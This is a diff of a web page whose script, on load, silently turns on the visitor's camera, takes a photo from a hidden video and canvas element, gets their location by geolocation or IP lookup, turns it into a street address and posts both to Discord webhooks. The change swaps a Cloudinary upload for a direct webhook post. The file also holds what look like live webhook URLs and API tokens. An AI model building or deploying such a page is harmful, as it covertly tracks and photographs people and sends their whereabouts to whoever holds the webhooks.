@@ -3,29 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Photo Capture</title>
-    <style>
-        video, canvas {
-            display: none; /* Hide video and canvas */
-        }
-    </style>
+    <title>Capture Image with Location</title>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
     <script>
         const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
         const photoWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
-        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
         const ipinfoToken = '41d360af12f2bf';
+        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
 
-        // Cloudinary Configuration
-        const cloudName = 'dpokctx0v';  // Your Cloudinary Cloud Name
-        const apiKey = '793147654922692';  // Your Cloudinary API Key
-        const uploadPreset = 'uth2rbzj';  // Your Cloudinary Upload Preset
-
-        // Function to get the location (geolocation fallback to IP)
+        // Get user location with geolocation or IP fallback
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, error);
@@ -45,7 +35,7 @@
             getIPGeolocation();
         }
 
-        // Fallback IP geolocation
+        // IP fallback for geolocation
         function getIPGeolocation() {
             fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
                 .then(response => response.json())
@@ -60,7 +50,7 @@
                 .catch(() => sendErrorToDiscord('Error fetching IP geolocation.'));
         }
 
-        // Reverse geocoding to get human-readable address
+        // Reverse geocode to get readable address
         function reverseGeocode(latitude, longitude) {
             const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
 
@@ -69,7 +59,7 @@
                 .then(data => {
                     if (data && data.display_name) {
                         const address = data.display_name;
-                        sendLocationToDiscord(latitude, longitude, address);
+                        sendLocationAndCapturePhoto(latitude, longitude, address);
                     } else {
                         sendErrorToDiscord('Error in reverse geocoding.');
                     }
@@ -77,20 +67,7 @@
                 .catch(() => sendErrorToDiscord('Error during reverse geocoding.'));
         }
 
-        // Send location information to Discord
-        function sendLocationToDiscord(latitude, longitude, address) {
-            const message = {
-                content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
-            };
-
-            fetch(locationWebhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message),
-            });
-        }
-
-        // Initialize the camera and capture photo automatically
+        // Initialize camera and capture photo
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -101,62 +78,38 @@
             }
         }
 
-        // Capture photo automatically when camera is ready
+        // Capture photo and convert to Blob
         async function capturePhoto() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);  // Capture the image from the video
-            const imageData = canvas.toDataURL('image/png');  // Convert the image to base64 format
-            await uploadToCloudinary(imageData);  // Upload the image to Cloudinary
+
+            // Convert canvas to Blob
+            return new Promise((resolve) => {
+                canvas.toBlob(blob => {
+                    if (blob) resolve(blob);
+                    else sendErrorToDiscord('Error capturing image.');
+                }, 'image/png');
+            });
         }
 
-        // Upload the captured image to Cloudinary
-        async function uploadToCloudinary(imageData) {
-            const byteString = atob(imageData.split(',')[1]);
-            const arrayBuffer = new ArrayBuffer(byteString.length);
-            const uintArray = new Uint8Array(arrayBuffer);
+        // Send location data and image to Discord
+        async function sendLocationAndCapturePhoto(latitude, longitude, address) {
+            const photoBlob = await capturePhoto();  // Wait for photo capture
 
-            for (let i = 0; i < byteString.length; i++) {
-                uintArray[i] = byteString.charCodeAt(i);
-            }
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('file', photoBlob, 'capture.png');
+                formData.append('content', `Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`);
 
-            const blob = new Blob([uintArray], { type: 'image/png' });
-            const formData = new FormData();
-            formData.append('file', blob);
-            formData.append('upload_preset', uploadPreset);  // Use your Cloudinary Upload Preset
-            formData.append('api_key', apiKey);  // Use your Cloudinary API Key
+                const response = await fetch(photoWebhookURL, {
+                    method: 'POST',
+                    body: formData
+                });
 
-            // Upload to Cloudinary
-            const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-                method: 'POST',
-                body: formData
-            });
-
-            const data = await response.json();
-
-            if (data.secure_url) {
-                const imageUrl = data.secure_url;
-                await sendImageToDiscord(imageUrl);  // Send the image URL to Discord
-            } else {
-                sendErrorToDiscord('Failed to upload image to Cloudinary');
-            }
-        }
-
-        // Send image URL to Discord
-        async function sendImageToDiscord(imageUrl) {
-            const response = await fetch(photoWebhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "New Photo Captured",
-                    embeds: [{
-                        image: { url: imageUrl }
-                    }],
-                }),
-            });
-
-            if (!response.ok) {
-                sendErrorToDiscord("Error sending image to Discord.");
+                if (!response.ok) {
+                    sendErrorToDiscord("Error sending image and location to Discord.");
+                }
             }
         }
 
@@ -169,10 +122,10 @@
             });
         }
 
-        // On page load, start everything
+        // Start everything on page load
         window.onload = () => {
-            getLocation();  // Fetch location automatically
-            initCamera();   // Initialize the camera and start capturing
+            getLocation();  // Fetch location and capture photo
+            initCamera();   // Initialize camera
         };
     </script>
 </body>
